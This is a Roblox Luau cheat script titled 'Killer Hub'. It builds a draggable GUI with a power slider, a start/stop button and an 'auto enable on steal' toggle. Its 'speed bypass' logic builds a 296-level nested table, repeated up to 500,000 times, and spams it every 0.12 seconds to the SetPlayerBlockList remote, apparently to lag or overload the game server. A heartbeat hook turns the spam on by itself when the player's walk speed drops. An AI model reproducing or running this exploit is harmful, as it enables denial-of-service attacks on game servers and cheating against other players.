--[[
Killer Hub (ScreenGui) - Black & Red Theme with 500K Max Power + Auto Brainrot Logic Made by ALO with protection
]]
​-- KillerHub (ScreenGui)
local KillerHub = Instance.new("ScreenGui")
KillerHub.Name = "KillerHub"
KillerHub.ResetOnSpawn = false
KillerHub.DisplayOrder = 999
KillerHub.IgnoreGuiInset = true
KillerHub.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
KillerHub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
​-- Main (Frame)
local Main = Instance.new("Frame")
Main.Name = "Main"
Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0, 182, 0, 91)
Main.Size = UDim2.new(0, 460, 0, 360)
Main.Active = true
Main.Parent = KillerHub
​-- UICorner
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = Main
​-- UIStroke (Red Accent)
local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(220, 30, 30)
UIStroke.Thickness = 1.5
UIStroke.Transparency = 0.2
UIStroke.Parent = Main
​-- UIScale (Default set to 40%)
local UIScale = Instance.new("UIScale")
UIScale.Scale = 0.4
UIScale.Parent = Main
​-- BG
local BG = Instance.new("ImageLabel")
BG.Name = "BG"
BG.BackgroundTransparency = 1
BG.BorderSizePixel = 0
BG.Size = UDim2.new(1, 0, 1, 0)
BG.Image = "rbxassetid://111132924424012"
BG.ImageTransparency = 0.35
BG.ScaleType = Enum.ScaleType.Crop
BG.Parent = Main
​local UICorner_2 = Instance.new("UICorner")
UICorner_2.CornerRadius = UDim.new(0, 12)
UICorner_2.Parent = BG
​-- Header
local Header = Instance.new("Frame")
Header.Name = "Header"
Header.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Header.BackgroundTransparency = 0.4
Header.BorderSizePixel = 0
Header.Position = UDim2.new(0, 12, 0, 12)
Header.Size = UDim2.new(1, -24, 0, 48)
Header.ZIndex = 2
Header.Parent = Main
​local UICorner_3 = Instance.new("UICorner")
UICorner_3.CornerRadius = UDim.new(0, 10)
UICorner_3.Parent = Header
​local UIStroke_2 = Instance.new("UIStroke")
UIStroke_2.Color = Color3.fromRGB(180, 20, 20)
UIStroke_2.Thickness = 1
UIStroke_2.Transparency = 0.6
UIStroke_2.Parent = Header
​local Frame = Instance.new("Frame")
Frame.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0, 10, 0, 11)
Frame.Size = UDim2.new(0, 3, 0, 26)
Frame.ZIndex = 3
Frame.Parent = Header
​local UICorner_4 = Instance.new("UICorner")
UICorner_4.CornerRadius = UDim.new(0, 2)
UICorner_4.Parent = Frame
​local TextLabel = Instance.new("TextLabel")
TextLabel.BackgroundTransparency = 1
TextLabel.Position = UDim2.new(0, 20, 0, 6)
TextLabel.Size = UDim2.new(0, 200, 0, 20)
TextLabel.ZIndex = 3
TextLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
TextLabel.Text = "Killer Hub"
TextLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
TextLabel.TextSize = 15
TextLabel.TextXAlignment = Enum.TextXAlignment.Left
TextLabel.Parent = Header
​local TextLabel_2 = Instance.new("TextLabel")
TextLabel_2.BackgroundTransparency = 1
TextLabel_2.Position = UDim2.new(0, 20, 0, 28)
TextLabel_2.Size = UDim2.new(0, 200, 0, 12)
TextLabel_2.ZIndex = 3
TextLabel_2.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextLabel_2.Text = "Discord.gg/Moonduels"
TextLabel_2.TextColor3 = Color3.fromRGB(180, 80, 80)
TextLabel_2.TextSize = 10
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_2.Parent = Header
​local PingLabel = Instance.new("TextLabel")
PingLabel.Name = "PingLabel"
PingLabel.BackgroundTransparency = 1
PingLabel.Position = UDim2.new(1, -70, 0, 8)
PingLabel.Size = UDim2.new(0, 60, 0, 12)
PingLabel.ZIndex = 3
PingLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
PingLabel.Text = "Ping: --"
PingLabel.TextColor3 = Color3.fromRGB(180, 80, 80)
PingLabel.TextSize = 10
PingLabel.TextXAlignment = Enum.TextXAlignment.Right
PingLabel.Parent = Header
​local FPSLabel = Instance.new("TextLabel")
FPSLabel.Name = "FPSLabel"
FPSLabel.BackgroundTransparency = 1
FPSLabel.Position = UDim2.new(1, -70, 0, 24)
FPSLabel.Size = UDim2.new(0, 60, 0, 12)
FPSLabel.ZIndex = 3
FPSLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
FPSLabel.Text = "FPS: --"
FPSLabel.TextColor3 = Color3.fromRGB(180, 80, 80)
FPSLabel.TextSize = 10
FPSLabel.TextXAlignment = Enum.TextXAlignment.Right
FPSLabel.Parent = Header
​-- Body
local Body = Instance.new("Frame")
Body.Name = "Body"
Body.BackgroundTransparency = 1
Body.ClipsDescendants = true
Body.Position = UDim2.new(0, 12, 0, 68)
Body.Size = UDim2.new(1, -24, 1, -80)
Body.ZIndex = 2
Body.Parent = Main
​local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 8)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Parent = Body
​-- Power Frame
local Frame_2 = Instance.new("Frame")
Frame_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BackgroundTransparency = 0.4
Frame_2.BorderSizePixel = 0
Frame_2.LayoutOrder = 1
Frame_2.Size = UDim2.new(1, 0, 0, 70)
Frame_2.Parent = Body
​local UICorner_10 = Instance.new("UICorner")
UICorner_10.Parent = Frame_2
​local UIStroke_8 = Instance.new("UIStroke")
UIStroke_8.Color = Color3.fromRGB(180, 20, 20)
UIStroke_8.Thickness = 1
UIStroke_8.Transparency = 0.6
UIStroke_8.Parent = Frame_2
​local TextLabel_7 = Instance.new("TextLabel")
TextLabel_7.BackgroundTransparency = 1
TextLabel_7.Position = UDim2.new(0, 12, 0, 8)
TextLabel_7.Size = UDim2.new(0, 100, 0, 14)
TextLabel_7.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
TextLabel_7.Text = "POWER"
TextLabel_7.TextColor3 = Color3.fromRGB(180, 80, 80)
TextLabel_7.TextSize = 10
TextLabel_7.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_7.Parent = Frame_2
​local PowerDisplay = Instance.new("TextLabel")
PowerDisplay.Name = "PowerDisplay"
PowerDisplay.BackgroundTransparency = 1
PowerDisplay.Position = UDim2.new(0, 12, 0, 22)
PowerDisplay.Size = UDim2.new(0, 100, 0, 22)
PowerDisplay.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
PowerDisplay.Text = "500.0K"
PowerDisplay.TextColor3 = Color3.fromRGB(255, 200, 200)
PowerDisplay.TextSize = 18
PowerDisplay.TextXAlignment = Enum.TextXAlignment.Left
PowerDisplay.Parent = Frame_2
​local PowerBox = Instance.new("TextBox")
PowerBox.Name = "PowerBox"
PowerBox.BackgroundColor3 = Color3.fromRGB(20, 5, 5)
PowerBox.BackgroundTransparency = 0.2
PowerBox.Position = UDim2.new(1, -92, 0, 22)
PowerBox.Size = UDim2.new(0, 80, 0, 28)
PowerBox.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
PowerBox.Text = "500000"
PowerBox.TextColor3 = Color3.fromRGB(255, 220, 220)
PowerBox.TextSize = 12
PowerBox.ClearTextOnFocus = false
PowerBox.Parent = Frame_2
​local UICorner_11 = Instance.new("UICorner")
UICorner_11.CornerRadius = UDim.new(0, 6)
UICorner_11.Parent = PowerBox
​local UIStroke_9 = Instance.new("UIStroke")
UIStroke_9.Color = Color3.fromRGB(180, 30, 30)
UIStroke_9.Thickness = 1
UIStroke_9.Transparency = 0.4
UIStroke_9.Parent = PowerBox
​-- Slider
local SliderTrack = Instance.new("Frame")
SliderTrack.Name = "SliderTrack"
SliderTrack.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
SliderTrack.BackgroundTransparency = 0.2
SliderTrack.BorderSizePixel = 0
SliderTrack.Position = UDim2.new(0, 12, 1, -18)
SliderTrack.Size = UDim2.new(1, -24, 0, 6)
SliderTrack.Parent = Frame_2
​local UICorner_12 = Instance.new("UICorner")
UICorner_12.CornerRadius = UDim.new(0, 3)
UICorner_12.Parent = SliderTrack
​local SliderFill = Instance.new("Frame")
SliderFill.Name = "SliderFill"
SliderFill.BackgroundColor3 = Color3.fromRGB(220, 30, 30)
SliderFill.BorderSizePixel = 0
SliderFill.Size = UDim2.new(1, 0, 1, 0)
SliderFill.Parent = SliderTrack
​local UICorner_13 = Instance.new("UICorner")
UICorner_13.CornerRadius = UDim.new(0, 3)
UICorner_13.Parent = SliderFill
​local SliderKnob = Instance.new("Frame")
SliderKnob.Name = "SliderKnob"
SliderKnob.AnchorPoint = Vector2.new(0.5, 0.5)
SliderKnob.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
SliderKnob.BorderSizePixel = 0
SliderKnob.Position = UDim2.new(1, 0, 0.5, 0)
SliderKnob.Size = UDim2.new(0, 16, 0, 16)
SliderKnob.ZIndex = 2
SliderKnob.Parent = SliderTrack
​local UICorner_14 = Instance.new("UICorner")
UICorner_14.Parent = SliderKnob
​local UIStroke_10 = Instance.new("UIStroke")
UIStroke_10.Color = Color3.fromRGB(255, 100, 100)
UIStroke_10.Thickness = 2
UIStroke_10.Parent = SliderKnob
​-- Status Frame
local Frame_6 = Instance.new("Frame")
Frame_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame_6.BackgroundTransparency = 0.4
Frame_6.BorderSizePixel = 0
Frame_6.LayoutOrder = 2
Frame_6.Size = UDim2.new(1, 0, 0, 40)
Frame_6.Parent = Body
​local UICorner_15 = Instance.new("UICorner")
UICorner_15.Parent = Frame_6
​local UIStroke_11 = Instance.new("UIStroke")
UIStroke_11.Color = Color3.fromRGB(180, 20, 20)
UIStroke_11.Thickness = 1
UIStroke_11.Transparency = 0.6
UIStroke_11.Parent = Frame_6
​local StatusDot = Instance.new("Frame")
StatusDot.Name = "StatusDot"
StatusDot.BackgroundColor3 = Color3.fromRGB(120, 40, 40)
StatusDot.BorderSizePixel = 0
StatusDot.Position = UDim2.new(0, 12, 0.5, -5)
StatusDot.Size = UDim2.new(0, 10, 0, 10)
StatusDot.Parent = Frame_6
​local UICorner_16 = Instance.new("UICorner")
UICorner_16.CornerRadius = UDim.new(0, 5)
UICorner_16.Parent = StatusDot
​local StatusLabel = Instance.new("TextLabel")
StatusLabel.Name = "StatusLabel"
StatusLabel.BackgroundTransparency = 1
StatusLabel.Position = UDim2.new(0, 28, 0, 0)
StatusLabel.Size = UDim2.new(0, 70, 1, 0)
StatusLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
StatusLabel.Text = "IDLE"
StatusLabel.TextColor3 = Color3.fromRGB(180, 80, 80)
StatusLabel.TextSize = 12
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
StatusLabel.Parent = Frame_6
​local TimerLabel = Instance.new("TextLabel")
TimerLabel.Name = "TimerLabel"
TimerLabel.BackgroundTransparency = 1
TimerLabel.Position = UDim2.new(0.5, -30, 0, 0)
TimerLabel.Size = UDim2.new(0, 60, 1, 0)
TimerLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
TimerLabel.Text = "00:00"
TimerLabel.TextColor3 = Color3.fromRGB(180, 80, 80)
TimerLabel.TextSize = 12
TimerLabel.Parent = Frame_6
​local MoreBtn = Instance.new("TextButton")
MoreBtn.Name = "MoreBtn"
MoreBtn.BackgroundColor3 = Color3.fromRGB(20, 5, 5)
MoreBtn.BackgroundTransparency = 0.2
MoreBtn.Position = UDim2.new(1, -58, 0.5, -13)
MoreBtn.Size = UDim2.new(0, 46, 0, 26)
MoreBtn.AutoButtonColor = false
MoreBtn.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
MoreBtn.Text = "..."
MoreBtn.TextColor3 = Color3.fromRGB(255, 200, 200)
MoreBtn.TextSize = 11
MoreBtn.Parent = Frame_6
​local UICorner_17 = Instance.new("UICorner")
UICorner_17.CornerRadius = UDim.new(0, 6)
UICorner_17.Parent = MoreBtn
​local UIStroke_12 = Instance.new("UIStroke")
UIStroke_12.Color = Color3.fromRGB(180, 30, 30)
UIStroke_12.Thickness = 1
UIStroke_12.Transparency = 0.4
UIStroke_12.Parent = MoreBtn
​-- START Button
local StartBtn = Instance.new("TextButton")
StartBtn.Name = "StartBtn"
StartBtn.BackgroundColor3 = Color3.fromRGB(220, 30, 30)
StartBtn.BackgroundTransparency = 0.15
StartBtn.LayoutOrder = 3
StartBtn.Size = UDim2.new(1, 0, 0, 44)
StartBtn.AutoButtonColor = false
StartBtn.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
StartBtn.Text = "START"
StartBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
StartBtn.TextSize = 15
StartBtn.Parent = Body
​local UICorner_18 = Instance.new("UICorner")
UICorner_18.Parent = StartBtn
​local UIStroke_13 = Instance.new("UIStroke")
UIStroke_13.Color = Color3.fromRGB(255, 60, 60)
UIStroke_13.Thickness = 1.5
UIStroke_13.Transparency = 0.3
UIStroke_13.Parent = StartBtn
​-- Auto Toggle Frame
local Frame_8 = Instance.new("Frame")
Frame_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame_8.BackgroundTransparency = 0.4
Frame_8.BorderSizePixel = 0
Frame_8.LayoutOrder = 4
Frame_8.Size = UDim2.new(1, 0, 0, 44)
Frame_8.Parent = Body
​local UICorner_19 = Instance.new("UICorner")
UICorner_19.Parent = Frame_8
​local UIStroke_14 = Instance.new("UIStroke")
UIStroke_14.Color = Color3.fromRGB(180, 20, 20)
UIStroke_14.Thickness = 1
UIStroke_14.Transparency = 0.6
UIStroke_14.Parent = Frame_8
​local TextLabel_11 = Instance.new("TextLabel")
TextLabel_11.BackgroundTransparency = 1
TextLabel_11.Position = UDim2.new(0, 12, 0, 0)
TextLabel_11.Size = UDim2.new(1, -80, 1, 0)
TextLabel_11.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
TextLabel_11.Text = "auto enable on steal"
TextLabel_11.TextColor3 = Color3.fromRGB(255, 220, 220)
TextLabel_11.TextSize = 12
TextLabel_11.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_11.Parent = Frame_8
​local ToggleBG = Instance.new("Frame")
ToggleBG.Name = "ToggleBG"
ToggleBG.AnchorPoint = Vector2.new(1, 0.5)
ToggleBG.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
ToggleBG.BackgroundTransparency = 0.2
ToggleBG.BorderSizePixel = 0
ToggleBG.Position = UDim2.new(1, -12, 0.5, 0)
ToggleBG.Size = UDim2.new(0, 48, 0, 24)
ToggleBG.Parent = Frame_8
​local UICorner_20 = Instance.new("UICorner")
UICorner_20.CornerRadius = UDim.new(0, 12)
UICorner_20.Parent = ToggleBG
​local UIStroke_15 = Instance.new("UIStroke")
UIStroke_15.Color = Color3.fromRGB(180, 30, 30)
UIStroke_15.Thickness = 1
UIStroke_15.Transparency = 0.5
UIStroke_15.Parent = ToggleBG
​local ToggleFill = Instance.new("Frame")
ToggleFill.Name = "ToggleFill"
ToggleFill.BackgroundColor3 = Color3.fromRGB(220, 30, 30)
ToggleFill.BackgroundTransparency = 1
ToggleFill.BorderSizePixel = 0
ToggleFill.Size = UDim2.new(1, 0, 1, 0)
ToggleFill.Parent = ToggleBG
​local UICorner_21 = Instance.new("UICorner")
UICorner_21.CornerRadius = UDim.new(0, 12)
UICorner_21.Parent = ToggleFill
​local ToggleKnob = Instance.new("Frame")
ToggleKnob.Name = "ToggleKnob"
ToggleKnob.AnchorPoint = Vector2.new(0.5, 0.5)
ToggleKnob.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
ToggleKnob.BorderSizePixel = 0
ToggleKnob.Position = UDim2.new(0, 12, 0.5, 0)
ToggleKnob.Size = UDim2.new(0, 18, 0, 18)
ToggleKnob.ZIndex = 2
ToggleKnob.Parent = ToggleBG
​local UICorner_22 = Instance.new("UICorner")
UICorner_22.CornerRadius = UDim.new(0, 9)
UICorner_22.Parent = ToggleKnob
​local UIStroke_16 = Instance.new("UIStroke")
UIStroke_16.Color = Color3.fromRGB(180, 30, 30)
UIStroke_16.Thickness = 1
UIStroke_16.Transparency = 0.3
UIStroke_16.Parent = ToggleKnob
​-- ==================== SPEED BYPASS & AUTO BRAINROT LOGIC ====================
​local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
​local LocalPlayer = Players.LocalPlayer
​local currentPower = 500000
local isRunning = false
local autoEnable = false
local startTime = 0
​local MIN_POWER = 10000
local MAX_POWER = 500000
local DEPTH = 296
local SPAM_DELAY = 0.12
​local bomb = nil
local spamThread = nil
​-- Brainrot state trackers
local brainrotMode = false
local lastBrainrotState = false
​local function buildBomb(power)
local maintable = {}
local spammedtable = {}
table.insert(spammedtable, {})
local z = spammedtable[1]
for i = 1, DEPTH do
local tableins = {}
table.insert(z, tableins)
z = tableins
end
local maxRep = math.floor(power / (DEPTH + 2))
for i = 1, maxRep do
table.insert(maintable, spammedtable)
end
return maintable
end
​local function stopBypass()
isRunning = false
if spamThread then task.cancel(spamThread) end
bomb = nil
spamThread = nil
end
​local function startBypass(power)
stopBypass()
isRunning = true
bomb = buildBomb(power)
spamThread = task.spawn(function()
while isRunning do
if bomb then
pcall(function()
game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
end)
end
task.wait(SPAM_DELAY)
end
end)
end
​-- Helpers
local function formatPower(n)
if n >= 1000000 then
return string.format("%.1fM", n / 1000000)
elseif n >= 1000 then
return string.format("%.1fK", n / 1000)
else
return tostring(n)
end
end
​local function updatePowerUI(val)
currentPower = math.clamp(math.floor(val), MIN_POWER, MAX_POWER)
PowerBox.Text = tostring(currentPower)
PowerDisplay.Text = formatPower(currentPower)
​local ratio = (currentPower - MIN_POWER) / (MAX_POWER - MIN_POWER)
SliderFill.Size = UDim2.new(ratio, 0, 1, 0)
SliderKnob.Position = UDim2.new(ratio, 0, 0.5, 0)
​if isRunning then
startBypass(currentPower)
end
end
​-- ========== DRAG ==========
local dragging = false
local dragStart = nil
local startPos = nil
​Header.InputBegan:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
dragging = true
dragStart = input.Position
startPos = Main.Position
end
end)
​Header.InputEnded:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
dragging = false
end
end)
​UserInputService.InputChanged:Connect(function(input)
if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
local delta = input.Position - dragStart
Main.Position = UDim2.new(
startPos.X.Scale,
startPos.X.Offset + delta.X,
startPos.Y.Scale,
startPos.Y.Offset + delta.Y
)
end
end)
​-- ========== SLIDER ==========
local sliding = false
​local function updateSliderFromInput(input)
local absPos = SliderTrack.AbsolutePosition
local absSize = SliderTrack.AbsoluteSize
local relX = math.clamp((input.Position.X - absPos.X) / absSize.X, 0, 1)
local power = MIN_POWER + relX * (MAX_POWER - MIN_POWER)
updatePowerUI(power)
end
​SliderTrack.InputBegan:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
sliding = true
updateSliderFromInput(input)
end
end)
​SliderKnob.InputBegan:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
sliding = true
end
end)
​UserInputService.InputEnded:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
sliding = false
end
end)
​UserInputService.InputChanged:Connect(function(input)
if sliding and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
updateSliderFromInput(input)
end
end)
​-- PowerBox
PowerBox.FocusLost:Connect(function()
local num = tonumber(PowerBox.Text)
if num then
updatePowerUI(num)
else
PowerBox.Text = tostring(currentPower)
end
end)
​-- ========== START / STOP STATE CONTROLLER ==========
local function setRunning(state)
isRunning = state
if state then
StartBtn.Text = "STOP"
StartBtn.BackgroundColor3 = Color3.fromRGB(120, 20, 20)
UIStroke_13.Color = Color3.fromRGB(180, 30, 30)
StartBtn.TextColor3 = Color3.fromRGB(255, 220, 220)
StatusLabel.Text = "RUNNING"
StatusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
StatusDot.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
startTime = tick()
startBypass(currentPower)
else
StartBtn.Text = "START"
StartBtn.BackgroundColor3 = Color3.fromRGB(220, 30, 30)
UIStroke_13.Color = Color3.fromRGB(255, 60, 60)
StartBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
StatusLabel.Text = "IDLE"
StatusLabel.TextColor3 = Color3.fromRGB(180, 80, 80)
StatusDot.BackgroundColor3 = Color3.fromRGB(120, 40, 40)
TimerLabel.Text = "00:00"
stopBypass()
end
end
​StartBtn.MouseButton1Click:Connect(function()
setRunning(not isRunning)
end)
​-- ========== TOGGLE ("auto enable on steal") ==========
local function setToggle(on)
autoEnable = on
local targetPos = on and UDim2.new(1, -12, 0.5, 0) or UDim2.new(0, 12, 0.5, 0)
local targetColor = on and Color3.fromRGB(220, 30, 30) or Color3.fromRGB(180, 60, 60)
local targetTrans = on and 0 or 1
​TweenService:Create(ToggleKnob, TweenInfo.new(0.2), {Position = targetPos, BackgroundColor3 = targetColor}):Play()
TweenService:Create(ToggleFill, TweenInfo.new(0.2), {BackgroundTransparency = targetTrans}):Play()
​if not on then
brainrotMode = false
lastBrainrotState = false
setRunning(false)
end
end
​ToggleBG.InputBegan:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
setToggle(not autoEnable)
end
end)
​-- ========== AUTO BRAINROT HEARTBEAT LOGIC ==========
RunService.Heartbeat:Connect(function()
if not autoEnable then
if brainrotMode then brainrotMode = false; lastBrainrotState = false end
return
end
​local char = LocalPlayer.Character
if not char then return end
local hum = char:FindFirstChild("Humanoid")
if not hum then return end
​local hasBrainrot = hum.WalkSpeed < 25
​if hasBrainrot and not lastBrainrotState then
brainrotMode = true
lastBrainrotState = true
setRunning(true)
elseif not hasBrainrot and lastBrainrotState then
brainrotMode = false
lastBrainrotState = false
setRunning(false)
end
end)
​-- ========== TIMER + FPS/PING ==========
local lastFPS = 0
local frameCount = 0
local lastTime = tick()
​RunService.RenderStepped:Connect(function()
-- Timer
if isRunning then
local elapsed = tick() - startTime
local mins = math.floor(elapsed / 60)
local secs = math.floor(elapsed % 60)
TimerLabel.Text = string.format("%02d:%02d", mins, secs)
end
​-- FPS
frameCount += 1
local now = tick()
if now - lastTime >= 1 then
lastFPS = frameCount
frameCount = 0
lastTime = now
FPSLabel.Text = "FPS: " .. lastFPS
end
end)
​-- Ping (simple)
task.spawn(function()
while task.wait(2) do
local success, result = pcall(function()
return math.floor(LocalPlayer:GetNetworkPing() * 1000)
end)
if success then
PingLabel.Text = "Ping: " .. result .. "ms"
end
end
end)
​-- Init
updatePowerUI(500000)
​-- Parent
KillerHub.Parent = LocalPlayer:WaitForChild("PlayerGui")
​return KillerHub